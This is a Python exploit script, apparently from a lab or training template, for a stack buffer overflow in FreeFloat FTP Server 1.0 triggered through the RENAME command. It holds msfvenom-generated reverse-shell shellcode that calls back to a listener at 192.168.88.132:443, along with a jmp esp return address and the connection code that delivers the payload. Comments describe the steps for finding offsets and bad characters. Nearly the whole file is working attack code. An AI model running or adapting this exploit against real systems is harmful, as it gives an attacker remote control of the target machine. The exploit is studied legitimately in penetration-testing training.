#!/usr/bin/env python
# skeleton script for bof.
# tested on FreeFloatFtp server 1.0
import socket
import struct

# TODO: change these by `msf-pattern_create -l <length>` and `msf-pattern_offset -q <eip value>`
# note the offset starts from 1, thus if it returns 246, it means you need to have (246 - 1)-char pad before.
# exmaple here: `msf-pattern_offset -l 300` and `msf-pattern_offset -q 41326941` => 246, which means there are 245-char pad.
# buff = 'a0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9'
# TODO: discover bad chars.
# bad_char = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" +
# "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" +
# "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" +
# "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" +
# "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" +
# "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" +
# "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" +
# "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" +
# "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" +
# "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" +
# "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" +
# "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" +
# "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" +
# "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" +
# "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" +
# "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
# buff = '\x90' * 245 + struct.pack('<L', 0xAAAAAAAA) + bad_char

# => find bad char "\x00\x0a\x0d"

# TODO: fill shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.88.132 LPORT=443 -f python -v sc -e x86/shikata_ga_nai -b "\x00\x0a\x0d" --smallest
sc =  b""
sc += b"\xdb\xc4\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x52\xbe\xb5"
sc += b"\x55\x76\x96\x83\xc2\x04\x31\x72\x13\x03\xc7\x46\x94"
sc += b"\x63\xdb\x81\xda\x8c\x23\x52\xbb\x05\xc6\x63\xfb\x72"
sc += b"\x83\xd4\xcb\xf1\xc1\xd8\xa0\x54\xf1\x6b\xc4\x70\xf6"
sc += b"\xdc\x63\xa7\x39\xdc\xd8\x9b\x58\x5e\x23\xc8\xba\x5f"
sc += b"\xec\x1d\xbb\x98\x11\xef\xe9\x71\x5d\x42\x1d\xf5\x2b"
sc += b"\x5f\x96\x45\xbd\xe7\x4b\x1d\xbc\xc6\xda\x15\xe7\xc8"
sc += b"\xdd\xfa\x93\x40\xc5\x1f\x99\x1b\x7e\xeb\x55\x9a\x56"
sc += b"\x25\x95\x31\x97\x89\x64\x4b\xd0\x2e\x97\x3e\x28\x4d"
sc += b"\x2a\x39\xef\x2f\xf0\xcc\xeb\x88\x73\x76\xd7\x29\x57"
sc += b"\xe1\x9c\x26\x1c\x65\xfa\x2a\xa3\xaa\x71\x56\x28\x4d"
sc += b"\x55\xde\x6a\x6a\x71\xba\x29\x13\x20\x66\x9f\x2c\x32"
sc += b"\xc9\x40\x89\x39\xe4\x95\xa0\x60\x61\x59\x89\x9a\x71"
sc += b"\xf5\x9a\xe9\x43\x5a\x31\x65\xe8\x13\x9f\x72\x0f\x0e"
sc += b"\x67\xec\xee\xb1\x98\x25\x35\xe5\xc8\x5d\x9c\x86\x82"
sc += b"\x9d\x21\x53\x04\xcd\x8d\x0c\xe5\xbd\x6d\xfd\x8d\xd7"
sc += b"\x61\x22\xad\xd8\xab\x4b\x44\x23\x3c\xb4\x31\x73\x38"
sc += b"\x5c\x40\x83\x41\x26\xcd\x65\x2b\x48\x98\x3e\xc4\xf1"
sc += b"\x81\xb4\x75\xfd\x1f\xb1\xb6\x75\xac\x46\x78\x7e\xd9"
sc += b"\x54\xed\x8e\x94\x06\xb8\x91\x02\x2e\x26\x03\xc9\xae"
sc += b"\x21\x38\x46\xf9\x66\x8e\x9f\x6f\x9b\xa9\x09\x8d\x66"
sc += b"\x2f\x71\x15\xbd\x8c\x7c\x94\x30\xa8\x5a\x86\x8c\x31"
sc += b"\xe7\xf2\x40\x64\xb1\xac\x26\xde\x73\x06\xf1\x8d\xdd"
sc += b"\xce\x84\xfd\xdd\x88\x88\x2b\xa8\x74\x38\x82\xed\x8b"
sc += b"\xf5\x42\xfa\xf4\xeb\xf2\x05\x2f\xa8\x03\x4c\x6d\x99"
sc += b"\x8b\x09\xe4\x9b\xd1\xa9\xd3\xd8\xef\x29\xd1\xa0\x0b"
sc += b"\x31\x90\xa5\x50\xf5\x49\xd4\xc9\x90\x6d\x4b\xe9\xb0"

# TODO: find `jmp esp` address by either of the following mona cmd:
# P.S.: use `!mona modules` to check module security status.
# !mona find -s "\xff\xe4" [-m <module>]
# !mona jmp -r ESP [-m <module>]
# !mona find -type instr -s "jmp esp" -p2p -x X [-m <module>]
jmp_esp_addr = 0x77D29353

pad = '\x90' * 30  # Sometimes crucial
buff = '\x90' * 245 + struct.pack('<L', jmp_esp_addr) + pad + sc

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #open socket
# TODO: change ip and port.
connect = s.connect(('192.168.88.128',21))              #IP address and port (21) from the target
# TODO: change interaction
s.recv(1024)                                          #FTPBanner
s.send('USER \r\n')                                   #Sending USER (Null user)
s.recv(1024) 
s.send('PASS \r\n')                                   #Sending Password (Null password)
s.recv(1024)
s.send('RENAME' + buff +'\r\n')
s.close()
